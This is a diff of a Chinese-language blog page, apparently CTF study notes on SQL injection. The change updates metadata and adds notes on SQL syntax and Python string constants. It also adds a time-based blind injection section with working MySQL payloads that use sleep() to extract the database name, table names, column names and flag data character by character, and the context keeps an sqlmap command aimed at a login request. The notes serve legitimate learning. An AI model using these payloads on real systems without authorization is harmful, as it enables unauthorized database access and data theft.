@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/69189f3e3203f7be000915ab.png">
 <meta property="article:published_time" content="2025-11-15T12:53:26.000Z">
-<meta property="article:modified_time" content="2025-12-05T06:16:12.245Z">
+<meta property="article:modified_time" content="2025-12-07T03:55:48.520Z">
 <meta property="article:author" content="suny">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://pic1.imgdb.cn/item/69189f3e3203f7be000915ab.png">
@@ -252,7 +252,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          952 字
+          1.5k 字
         
       </span>
     
@@ -263,7 +263,7 @@
         
         
         
-          8 分钟
+          13 分钟
         
       </span>
     
@@ -305,7 +305,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年12月5日 下午
+                    本文最后更新于 2025年12月7日 中午
                   
                 
               </p>
@@ -462,9 +462,73 @@
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -r login.txt -p username --dbs<br></code></pre></td></tr></table></figure></li>
 </ol>
 <h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44005305/article/details/146025669">sqlmap常用命令整理</a></p>
-<h2 id="三、MySQL结构"><a href="#三、MySQL结构" class="headerlink" title="三、MySQL结构"></a>三、MySQL结构</h2><h2 id="四、手工注入"><a href="#四、手工注入" class="headerlink" title="四、手工注入"></a>四、手工注入</h2><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1539207">这可能是最全的SQL注入总结，不来看看吗</a></p>
+<h2 id="三、SQL语法"><a href="#三、SQL语法" class="headerlink" title="三、SQL语法"></a>三、SQL语法</h2><p>在 SQL 中，<code>SHOW COLUMNS FROM flag</code> 语句用于显示名为 <code>flag</code> 的表中各列的详细信息。它返回的结果通常是一个结果集，每行代表表中的一列，各列提供了关于该列的不同元数据信息。常见的格式如下：</p>
+<p><strong>列名</strong>：显示各列信息的标题。通常包含以下常见列：</p>
+<ul>
+<li><strong>Field</strong>：列的名称。这是表中定义的列标识符。例如，如果表中有一个存储用户名的列，这里会显示相应的列名，如 <code>username</code>。</li>
+<li><strong>Type</strong>：列的数据类型。表明该列可以存储的数据类型，如 <code>INT</code>（整数类型）、<code>VARCHAR(255)</code>（可变长度字符串，最大长度为 255）、<code>DATE</code>（日期类型）等。</li>
+<li><strong>Null</strong>：表示该列是否允许存储 <code>NULL</code> 值。如果显示 <code>YES</code>，则该列可以接受 <code>NULL</code>；如果显示 <code>NO</code>，则不允许。</li>
+<li><strong>Key</strong>：显示该列是否被定义为键（如主键 <code>PRI</code>、唯一键 <code>UNI</code> 等）。如果是主键列，这里会显示 <code>PRI</code>。</li>
+<li><strong>Default</strong>：列的默认值。如果在创建表时为该列设置了默认值，这里会显示出来。例如，若某列默认值为 <code>0</code>，则会在此处显示 <code>0</code>。如果没有设置默认值，可能显示为 <code>NULL</code> 或空白（具体取决于数据库系统）。</li>
+<li><strong>Extra</strong>：提供关于该列的额外信息。例如，对于自增长列，这里可能显示 <code>auto_increment</code>。</li>
+</ul>
+<h2 id="四、手工注入"><a href="#四、手工注入" class="headerlink" title="四、手工注入"></a>四、手工注入</h2><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1539207">这可能是最全的SQL注入总结，不来看看吗</a></p>
 <h4 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_69100706/article/details/140707246">整数型SQL注入</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.51cto.com/m0re/3867378">SQL注入——整数型注入、报错注入</a></p>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><h5 id="string-模块的常用常量"><a href="#string-模块的常用常量" class="headerlink" title="string 模块的常用常量"></a>string 模块的常用常量</h5><table>
+<thead>
+<tr>
+<th>常量名</th>
+<th>含义</th>
+<th>示例值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>string.ascii_lowercase</code></td>
+<td>26 个小写英文字母</td>
+<td>abcdefghijklmnopqrstuvwxyz</td>
+</tr>
+<tr>
+<td><code>string.ascii_uppercase</code></td>
+<td>所有大写英文字母</td>
+<td>ABCDEFGHIJKLMNOPQRSTUVWXYZ</td>
+</tr>
+<tr>
+<td><code>string.digits</code></td>
+<td>所有数字</td>
+<td>0123456789</td>
+</tr>
+<tr>
+<td><code>string.ascii_letters</code></td>
+<td>所有大小写英文字母（结合上面两个）</td>
+<td>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ</td>
+</tr>
+<tr>
+<td><code>string.punctuation</code></td>
+<td>所有标点符号</td>
+<td>!”#$%&amp;’()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;{}~</td>
+</tr>
+</tbody></table>
+<p><strong>获取数据库长度</strong></p>
+<blockquote>
+<p>?id&#x3D;1 and if(length(database())&#x3D;4,sleep(5),1) –+</p>
+</blockquote>
+<p><strong>获取数据库名</strong></p>
+<blockquote>
+<p>?id&#x3D;1 and if(substr(database(),1,1)&#x3D;’s’,sleep(5),1) –+</p>
+</blockquote>
+<p><strong>获取表名</strong></p>
+<blockquote>
+<p>?id&#x3D;1 and if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1)&#x3D;’c’,sleep(5),1)–+</p>
+</blockquote>
+<p><strong>获取列名</strong></p>
+<blockquote>
+<p>?id&#x3D;1 and if(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’sqli’),1,1)&#x3D;’a’,sleep(5),1)–+</p>
+</blockquote>
+<p><strong>获取数据</strong></p>
+<blockquote>
+<p>?id&#x3D;1 and if(substr((select group_concat(flag) from flag),1,1)&#x3D;’a’,sleep(5),1)–+</p>
+</blockquote>
 
                 
               </div>
@@ -558,8 +622,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/11/08/CTF%E6%9D%82%E8%AE%B0/" title="CTF零碎题目">
-                        <span class="hidden-mobile">CTF零碎题目</span>
+                      <a href="/2025/11/08/CTF%E6%9D%82%E8%AE%B0/" title="CTF杂记">
+                        <span class="hidden-mobile">CTF杂记</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
